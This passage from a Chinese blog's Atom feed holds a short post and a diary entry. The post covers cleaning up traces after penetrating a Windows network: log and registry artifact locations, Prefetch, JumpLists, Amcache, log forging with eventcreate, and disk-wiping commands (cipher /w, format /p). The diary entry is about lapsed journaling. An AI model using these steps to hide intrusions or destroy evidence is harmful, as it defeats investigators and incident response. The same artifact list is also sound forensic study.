    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透完毕后，需要对痕迹进行清理，以免被马上发现或轻松溯源。</p><span id="more"></span><h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><p>查看日志 <code>eventvwr</code><br>伪造日志 <code>eventcreate</code><br><strong>操作日志</strong></p><ul><li>3389登录列表</li><li>文件打开日志</li><li>文件修改日志</li><li>浏览器日志</li><li>系统事件</li><li>程序安装记录</li><li>程序删除记录</li><li>程序更新记录</li></ul><p><strong>登录日志</strong></p><ul><li>系统安全日志</li></ul><p><strong>日志路径</strong></p><ul><li>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li><li>安全日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li><li>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li></ul><p><strong>服务日志</strong></p><ul><li>IIS <code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</code></li></ul><h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><ul><li>AppCompatFlags</li><li>Background Activity Moderator(BAM)</li><li>MuiCache</li><li>RecentApps</li><li>RunMRU</li><li>ShimCache(AppCompatCache)</li></ul><h2 id="注册表键"><a href="#注册表键" class="headerlink" title="注册表键"></a>注册表键</h2><ul><li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li></ul><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><h2 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h2><p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。位置在 <code>C:\Windows\Prefetch</code></p><h2 id="JumpLists"><a href="#JumpLists" class="headerlink" title="JumpLists"></a>JumpLists</h2><p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在 <code>%AppData%\Microsoft\Windows\Recent</code></p><h2 id="Amcache-x2F-RecentFileCache-bcf"><a href="#Amcache-x2F-RecentFileCache-bcf" class="headerlink" title="Amcache&#x2F;RecentFileCache.bcf"></a>Amcache&#x2F;RecentFileCache.bcf</h2><p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的事件和最后修改时间。</p><p>在Windows7、Windows Server 2008 R2等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf</code> ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。</p><p>在Windows8、Windows10、Windows Server 2012等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\Amcache.hve</code> ，包含文件大小、版本、sha1、二进制文件类型等信息。</p><h1 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h1><p>Windows时间轴是Windows 10在1803版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等。</p><h1 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h1><ul><li>多次覆写文件 <code>cipher /w:&lt;path&gt;</code></li><li>格式化某磁盘count次 <code>format D: /p:&lt;count&gt;</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透完毕后，需要对痕迹进行清理，以免被马上发现或轻松溯源。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="痕迹清理" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>一下子</title>
    <link href="http://example.com/2023/08/22/Diary_20230822/"/>
    <id>http://example.com/2023/08/22/Diary_20230822/</id>
    <published>2023-08-21T16:00:00.000Z</published>
    <updated>2023-08-22T16:26:18.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一下子就没写日记了。</p><span id="more"></span><h1 id="一瞬间"><a href="#一瞬间" class="headerlink" title="一瞬间"></a>一瞬间</h1><p>突然有了好几天没写日记，而我今天也不想写，反而只是在浪费时间。<br>感觉，就像弦突然断掉了一样。</p><p>但无论如何，还得坚持下去，有时虽然只是在说些无意义的话。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一下子就没写日记了。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
</feed>
